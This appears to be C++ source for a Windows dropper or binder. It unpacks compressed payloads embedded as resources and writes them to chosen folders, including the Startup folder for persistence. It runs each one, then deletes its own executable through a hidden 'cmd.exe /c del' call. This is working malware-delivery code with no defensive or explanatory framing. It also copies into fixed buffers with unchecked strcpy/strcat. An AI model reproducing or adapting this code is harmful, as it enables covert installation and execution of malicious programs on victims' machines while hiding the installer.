#include<windows.h>
#include <shlobj.h>
#include <compressapi.h>
#pragma comment(lib,"Cabinet.lib")

struct FILEINFO
{
	UINT method;
	char path[MAX_PATH] = { 0 };
	int fileSzie;
};

void OutAllResource()
{
	int resID=101;
	FILEINFO fileinfo;
	ZeroMemory(&fileinfo, sizeof(FILEINFO));
	DECOMPRESSOR_HANDLE Decompressor = NULL;
	CreateDecompressor(COMPRESS_ALGORITHM_XPRESS_HUFF, NULL, &Decompressor);
	while (1)
	{
		HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(resID), RT_RCDATA);
		if (hRsrc == NULL)
			return;
		DWORD totalSize = SizeofResource(NULL, hRsrc);
		if (totalSize == 0)
			return;
		HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
		if (hGlobal == NULL)
			return;
		LPVOID pBuffer = LockResource(hGlobal);
		if (pBuffer == NULL)
			return;
		memcpy(&fileinfo, pBuffer, sizeof(FILEINFO));
		int CompressedBufferSize = totalSize - sizeof(FILEINFO);
		PBYTE CompressedBuffer = (PBYTE)malloc(CompressedBufferSize);
		memcpy(CompressedBuffer, (char*)pBuffer+ sizeof(FILEINFO), CompressedBufferSize);
		char filepath[MAX_PATH] = { 0 };
		switch (fileinfo.method)
		{
		case 0:
			strcpy(filepath, fileinfo.path);
			break;
		case 1:
			SHGetSpecialFolderPathA(NULL, filepath, CSIDL_APPDATA, FALSE);
			strcat(filepath, "\\");
			strcat(filepath, fileinfo.path);
			break;
		case 2:
			SHGetSpecialFolderPathA(NULL, filepath, CSIDL_COMMON_DOCUMENTS, FALSE);
			strcat(filepath, "\\");
			strcat(filepath, fileinfo.path);
			break;
		case 3:
			SHGetSpecialFolderPathA(NULL, filepath, CSIDL_STARTUP, FALSE);
			strcat(filepath, "\\");
			strcat(filepath, fileinfo.path);
			break;
		case 4:
			SHGetSpecialFolderPathA(NULL, filepath, CSIDL_DESKTOPDIRECTORY, FALSE);
			strcat(filepath, "\\");
			strcat(filepath, fileinfo.path);
			break;
		default:
			break;
		}
		PBYTE DecompressedBuffer = (PBYTE)malloc(fileinfo.fileSzie);
		SIZE_T DecompressedDataSize;
		Decompress(Decompressor,CompressedBuffer, CompressedBufferSize, DecompressedBuffer,fileinfo.fileSzie,&DecompressedDataSize);
		HANDLE hFile = CreateFileA(filepath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			return;
		}
		DWORD dwNum = 0;
		WriteFile(hFile, DecompressedBuffer, fileinfo.fileSzie, &dwNum, NULL);
		CloseHandle(hFile);
		ShellExecuteA(NULL, "open", filepath, NULL, NULL, SW_SHOW);
		free(DecompressedBuffer);
		free(CompressedBuffer);
		resID++;
	}
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	OutAllResource();
	char currentpath[MAX_PATH] = { 0 };
	char szBat[MAX_PATH] = "/c del ";
	GetModuleFileNameA(NULL, currentpath, MAX_PATH);
	strcat(szBat, currentpath);
	ShellExecuteA(0, "open", "cmd.exe", szBat, NULL, SW_HIDE);
	exit(1);
}
